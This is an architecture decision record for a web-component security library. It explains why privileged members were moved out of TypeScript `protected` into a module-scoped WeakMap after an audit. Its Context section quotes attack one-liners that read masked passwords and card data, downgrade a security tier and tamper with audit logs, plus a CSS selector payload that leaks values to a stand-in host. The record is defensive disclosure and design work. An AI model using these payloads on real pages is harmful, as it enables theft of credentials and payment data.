# ADR-0006: Hold the privileged surface in a module-scoped WeakMap, not in `protected` members

## Status
**Accepted** — 14 September 2026. Amends ADR-0002.
A security audit of 0.4.2 found that the encapsulation ADR-0002 argues for was not
enforced by the code implementing it. Every `protected` member of
`SecureBaseComponent` shipped as an ordinary public prototype method, so the closed
shadow root, tier immutability and the audit log were all reachable from page script.
This record exists because the replacement mechanism is unusual enough that someone
will try to simplify it back.

## Context
ADR-0002 committed to two things: the shadow root is closed, and
`SecureBaseComponent` is not part of the public API. Both were implemented with
TypeScript's `protected` keyword.

`protected` is a compile-time annotation. It is erased at emit. It constrains the
authors of this repository and nobody else. The shipped `dist/core/base-component.js`
contained, literally:

```js
get root(){return this.#e}
initializeSecurity(){const t=this.getAttribute("security-tier");t&&d(t)&&(this.#n=t),…}
```

So the whole confidentiality model came apart in one line each:

- `el.root.querySelector('input').value` — the real password of a masked CRITICAL
  field, and the raw PAN and CVC of a `<secure-card>`. This defeats masking, the
  value-free event contract (ADR-0004) and the PCI claim simultaneously, and it needs
  no exploit: `Element.shadowRoot` correctly returns `null`, and then a second
  accessor hands the root over anyway.
- `el.setAttribute('security-tier','public'); el.initializeSecurity()` — a live tier
  downgrade (ADR-0001). Config is read per-use, not cached at mount, so the next
  keystroke renders the password in cleartext with autocomplete re-enabled and the
  audit trail silenced.
- `el.addComponentStyles('input[value^="a"]{background:url(//evil/a)}')` — arbitrary
  CSS *inside* the closed shadow root. A strict CSP does not stop this: the bundle
  path uses `adoptedStyleSheets`, and constructable stylesheets are exempt from
  `style-src 'unsafe-inline'` (ADR-0003). Attribute-selector exfiltration of a masked
  value follows, one character at a time.
- `el.clearAuditLog()` erases the evidence, `el.audit()` forges it, and
  `el.recordTelemetryInput()` manufactures human-looking behaviour to defeat the risk
  score the server is asked to trust.

The failure was invisible to every tool in the project. `tsc` was satisfied — that is
what `protected` means to it. ESLint was satisfied. All 1216 tests passed, because the
tests reached through the same hole (`(el as any).root`) and therefore asserted that it
worked.

## Decision
The privileged members are removed from the prototype entirely. They are collected in
a `ComponentInternals` object, registered in a module-scoped `WeakMap` by the base
constructor, and reached through an exported `internals(component)` function in
`src/core/base-component.ts`.

Sibling modules inside this package import `internals` and write
`internals(this).root`, `internals(this).audit(…)`. Consumer code cannot: `internals`
is not re-exported from `src/index.ts`, so it is absent from every entry in the
package's `exports` map and from the bundle's export list. There is no property key
on the element to find.

`sanitizeValue`, `validateInput`, `handleAttributeChange`, `render` and the threat-label
helpers remain `protected`. They are pure or are override hooks; calling them from
outside achieves nothing.

Three tests enforce the boundary
(`tests/core/encapsulation-invariants.test.ts`): no element exposes any forbidden
member, no prototype in the chain defines a `root` accessor, and no symbol on the
library's prototypes holds a `ShadowRoot`.

## Alternatives considered
**Keep `protected` and document that it is advisory.** This is the status quo that
produced the finding. The annotation reads as an access control to every author who
sees it, which is precisely why nobody checked the emitted output for four releases.

**Symbol keys.** The obvious answer, and wrong: symbols are discoverable.
`Object.getOwnPropertySymbols(Object.getPrototypeOf(el))` enumerates them, and the
value is then one index lookup away. A symbol is an obscurity measure, not a boundary,
and it would have produced a fix that looked convincing while changing nothing.

**A key argument — `root(KEY)` where `KEY` is a module-private token.** Genuinely
secure, since the token never leaves the module graph. Rejected on ergonomics: every
one of the ~104 call sites grows an argument that exists only to be checked, and a
future member added without the check is invisible in review. The WeakMap concentrates
the boundary in one function.

**`#private` methods with no external access at all.** Correct for members only the
base class calls, and that is what `#lockSecurityTier` and `#audit` now are. It does
not answer the case the subclasses genuinely need — a subclass cannot reach a `#`
member of its base.

**Freeze the internals object.** Considered and declined. It is already unreachable
from outside the module graph, so freezing adds nothing against the threat model, and
it would remove the seam the tests use to stub `checkRateLimit` on a single instance.

## Consequences

**Negative.** Call sites are noisier: `internals(this).audit(…)` instead of
`this.audit(…)`, across every component. A new component that forgets the import gets
a compile error rather than a silent fallback, which is the right failure but is one
more thing to learn. The indirection is unusual enough that a reader unfamiliar with
the reason will read it as over-engineering — this record is the answer, and it has to
be found first. Tests must go through `tests/helpers/internals.ts`, so a test cannot
poke at internals as casually as before; 463 call sites were rewritten to do this. The
`WeakMap` adds one entry per component instance. And the boundary still depends on
`internals` never being re-exported: nothing but review and the export assertions in
`tests/build/bundle.test.ts` prevents someone adding it to `src/index.ts`.

**Positive.** The closed shadow root is actually closed, and the tier is actually
immutable — both now hold against a page script rather than against a type checker.
The privileged surface is enumerable in one interface, so "what can a subclass do that
a consumer cannot" has a single, readable answer. The boundary is testable, and is
tested, in a way `protected` never was. The same pattern extends to any future
privileged member without further design.

## Follow-up
1. Nothing prevents `internals` from being re-exported from `src/index.ts` by
   accident. Add an assertion over the bundle's export list, alongside the existing
   `./base-component` checks.
2. `Object.getPrototypeOf(SecureInput)` still reaches the base class through the
   prototype chain. That is inherent to JS inheritance; ADR-0002 says extension is
   unsupported, not prevented. Do not attempt to close it.
3. Audit the remaining `protected` members whenever one is added: the question is not
   "should a subclass call this?" but "what happens when a page script does?".
